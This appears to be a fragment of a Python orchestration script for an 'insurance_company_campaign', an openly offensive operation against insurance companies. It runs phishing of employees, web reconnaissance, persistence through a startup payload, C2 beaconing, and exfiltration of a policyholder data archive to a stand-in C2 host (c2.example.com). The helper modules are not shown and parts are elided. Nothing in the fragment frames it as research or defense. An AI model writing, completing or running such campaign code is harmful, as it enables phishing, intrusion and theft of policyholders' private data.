...
def main():
    """
    Main function to run the insurance_company_campaign campaign.
    """
    print(f"[*] Starting insurance_company_campaign campaign...")

    # 1. Initial Access
    print("[*] Phase 1: Initial Access")
    initial_access.phishing_attack("insurance_companies_employees.txt")
    run_tool("apt_web_recon.js", "--target insurance_companies.com")


    # 2. Persistence
    print("\n[*] Phase 2: Persistence")
    persistence.add_startup_script("payloads/policyholder_data_exfiltrator.py")
    ...
    command_control.send_beacon(c2_server, "VICTIM-INSURANCE_COMPANIES-01")
    ...
    exfiltration.exfiltrate_data("policyholder_data/policyholder_data.zip", "https://c2.example.com/upload")
    run_tool("payloads/policyholder_data_exfiltrator.py")
